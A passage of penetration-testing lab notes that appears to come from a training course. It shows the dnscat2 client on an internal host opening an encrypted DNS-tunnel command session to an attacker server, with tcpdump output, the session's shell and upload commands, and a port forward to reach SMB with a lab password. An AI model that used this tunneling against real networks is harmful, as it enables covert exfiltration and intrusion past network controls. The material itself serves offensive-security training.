Now that our server is set up, we'll move to `PGDATABASE01` to run the **dnscat2** client binary
+ The binary is already on the server for this exercise
+ However, we could have transferred the binary from our Kali machine to `PGDATABASE01` via our SSH connection using `SCP`
+ Thinking about exfiltration techniques (like DNS tunneling) may seem to present a "chicken or the egg" problem.How do we get the DNS tunneling client onto a host if we don't have command execution? Exfiltration is simply a tool we'll use to transfer data. It should be coupled with an exploitation vector that provides access to the target network

We'll run the **dnscat2** client binary from the dnscat folder in the database_admin home directory, with the **feline.corp** domain passed as the only argument
```
database_admin@pgdatabase01:~$ cd dnscat/
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
Creating DNS driver:
 domain = feline.corp
 host   = 0.0.0.0
 port   = 53
 type   = TXT,CNAME,MX
 server = 127.0.0.53

Encrypted session established! For added security, please verify the server also displays this string:

Annoy Mona Spiced Outran Stump Visas 

Session established!
```
+ The dnscat2 client reports that a session has been established. We can check for connections back on our dnscat2 server:
```
kali@felineauthority:~$ dnscat2-server feline.corp
[sudo] password for kali: 

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=7a87a5d0a8480b080896606df6b63944 feline.corp

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=7a87a5d0a8480b080896606df6b63944

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2> New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Annoy Mona Spiced Outran Stump Visas

dnscat2>
```

Our session is connected! DNS is working exactly as expected
+ Requests from `PGDATABASE01` are being resolved by `MULTISERVER03`, and end up on `FELINEAUTHORITY`
+ When run without a pre-shared _--secret_ flag at each end, dnscat2 will print an _authentication string_. This is used to verify the connection integrity after the encryption has been negotiated. The authentication string in this case ("Annoy Mona Spiced Outran Stump Visas") is the same on both client and server, so we know there's no in-line tampering. Every time a connection is made, the authentication string will change

We can use our tcpdump process to monitor the DNS requests to **feline.corp**:
```
...
07:22:14.732111 IP 192.168.50.64.51077 > 192.168.118.4.domain: 29066+ [1au] TXT? 8f150140b65c73af271ce019c1ede35d28.feline.corp. (75)
07:22:14.732538 IP 192.168.118.4.domain > 192.168.50.64.51077: 29066 1/0/0 TXT "b40d0140b6a895ada18b30ffff0866c42a" (111)
07:22:15.387435 IP 192.168.50.64.65022 > 192.168.118.4.domain: 65401+ CNAME? bbcd0158e09a60c01861eb1e1178dea7ff.feline.corp. (64)
07:22:15.388087 IP 192.168.118.4.domain > 192.168.50.64.65022: 65401 1/0/0 CNAME a2890158e06d79fd12c560ffff57240ba6.feline.corp. (124)
07:22:15.741752 IP 192.168.50.64.50500 > 192.168.118.4.domain: 6144+ [1au] CNAME? 38b20140b6a4ccb5c3017c19c29f49d0db.feline.corp. (75)
07:22:15.742436 IP 192.168.118.4.domain > 192.168.50.64.50500: 6144 1/0/0 CNAME e0630140b626a6fa2b82d8ffff0866c42a.feline.corp. (124)
07:22:16.397832 IP 192.168.50.64.50860 > 192.168.118.4.domain: 16449+ MX? 8a670158e004d2f8d4d5811e1241c3c1aa.feline.corp. (64)
07:22:16.398299 IP 192.168.118.4.domain > 192.168.50.64.50860: 16449 1/0/0 MX 385b0158e0dbec12770c9affff57240ba6.feline.corp. 10 (126)
07:22:16.751880 IP 192.168.50.64.49350 > 192.168.118.4.domain: 5272+ [1au] MX? 68fd0140b667aeb6d6d26119c3658f0cfa.feline.corp. (75)
07:22:16.752376 IP 192.168.118.4.domain > 192.168.50.64.49350: 5272 1/0/0 MX d01f0140b66950a355a6bcffff0866c42a.feline.corp. 10 (126)
07:22:17.407889 IP 192.168.50.64.50621 > 192.168.118.4.domain: 39215+ MX? cd6f0158e082e5562128b71e1353f111be.feline.corp. (64)
07:22:17.408397 IP 192.168.118.4.domain > 192.168.50.64.50621: 39215 1/0/0 MX 985d0158e00880dad6ec05ffff57240ba6.feline.corp. 10 (126)
07:22:17.762124 IP 192.168.50.64.49720 > 192.168.118.4.domain: 51139+ [1au] TXT? 49660140b6509f242f870119c47da533b7.feline.corp. (75)
07:22:17.762610 IP 192.168.118.4.domain > 192.168.50.64.49720: 51139 1/0/0 TXT "8a3d0140b6b05bb6c723aeffff0866c42a" (111)
07:22:18.417721 IP 192.168.50.64.50805 > 192.168.118.4.domain: 57236+ TXT? 3e450158e0e52d9dbf02e91e1492b9d0c5.feline.corp. (64)
07:22:18.418149 IP 192.168.118.4.domain > 192.168.50.64.50805: 57236 1/0/0 TXT "541d0158e09264101bde14ffff57240ba6" (111)
07:22:18.772152 IP 192.168.50.64.50433 > 192.168.118.4.domain: 7172+ [1au] TXT? d34f0140b6d6bd4779cb2419c56ad7d600.feline.corp. (75)
07:22:18.772847 IP 192.168.118.4.domain > 192.168.50.64.50433: 7172 1/0/0 TXT "17880140b6d23c86eaefe7ffff0866c42a" (111)
07:22:19.427556 IP 192.168.50.64.50520 > 192.168.118.4.domain: 53513+ CNAME? 8cd10158e01762c61a056c1e1537228bcc.feline.corp. (64)
07:22:19.428064 IP 192.168.118.4.domain > 192.168.50.64.50520: 53513 1/0/0 CNAME b6e10158e0a682c6c1ca43ffff57240ba6.feline.corp. (124)
07:22:19.782712 IP 192.168.50.64.50186 > 192.168.118.4.domain: 58205+ [1au] TXT? 8d5a0140b66454099e7a8119c648dffe8e.feline.corp. (75)
07:22:19.783146 IP 192.168.118.4.domain > 192.168.50.64.50186: 58205 1/0/0 TXT "2b4c0140b608687c966b10ffff0866c42a" (111)
07:22:20.438134 IP 192.168.50.64.65235 > 192.168.118.4.domain: 52335+ CNAME? b9740158e00bc5bfbe3eb81e16454173b8.feline.corp. (64)
07:22:20.438643 IP 192.168.118.4.domain > 192.168.50.64.65235: 52335 1/0/0 CNAME c0330158e07c85b2dfc880ffff57240ba6.feline.corp. (124)
07:22:20.792283 IP 192.168.50.64.50938 > 192.168.118.4.domain: 958+ [1au] TXT? b2d20140b600440d37090f19c79d9f6918.feline.corp. (75)
...
```

The dnscat2 process is using _CNAME_, _TXT_, and _MX_ queries and responses
+ As indicated by this network data, DNS tunneling is certainly not stealthy!
+ This output reveals a huge data transfer from the dnscat2 client to the server
+ All the request and response payloads are encrypted, so it's not particularly beneficial to keep logging the traffic
+ Will go ahead and kill tcpdump with Ctrl+C

Now we'll start interacting with our session from the dnscat2 server
+ Let's list all the active windows with the **windows** command, then run **window -i** from our new "command" shell to list the available commands:
```
dnscat2> windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Annoy Mona Spiced Outran Stump Visas
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

command (pgdatabase01) 1> ?

Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* quit
* set
* shell
* shutdown
* suspend
* tunnels
* unset
* upload
* window
* windows
command (pgdatabase01) 1>
```

This returns a prompt with a "command" prefix
+ This is the dnscat2 _command session_, and it supports quite a few options
+ We can learn more about each command by running it with the **--help** flag

Since we're trying to tunnel in this Module, let's investigate the port forwarding options
+ We can use **listen** to set up a listening port on our dnscat2 server, and push TCP traffic through our DNS tunnel, where it will be decapsulated and pushed to a socket we specify
+ Let's background our _console session_ by pressing Ctrl+Z. Back in the _command session_, let's run **listen --help**:
```
command (pgdatabase01) 1> listen --help
Error: The user requested help
Listens on a local port and sends the connection out the other side (like ssh
	-L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
  --help, -h:   Show this message
```
+ According to the help message output, **listen** operates much like **ssh -L**. And we should be very familiar with that by now

Let's try to connect to the SMB port on `HRSHARES`, this time through our DNS tunnel
+ We'll set up a local port forward, listening on 4455 on the loopback interface of `FELINEAUTHORITY`, and forwarding to 445 on `HRSHARES`:
```
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
Listening on 127.0.0.1:4455, sending connections to 172.16.2.11:445
command (pgdatabase01) 1> 
```

From another shell on `FELINEAUTHORITY` we can list the SMB shares through this port forward
```
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```
+ The connection is slower than a direct connection, but this is expected given that our SMB packets are being transported through the dnscat2 DNS tunnel
+ TCP-based SMB packets, encapsulated in DNS requests and responses transported over UDP, are pinging back and forth to the SMB server on `HRSHARES`, deep in the internal network. Excellent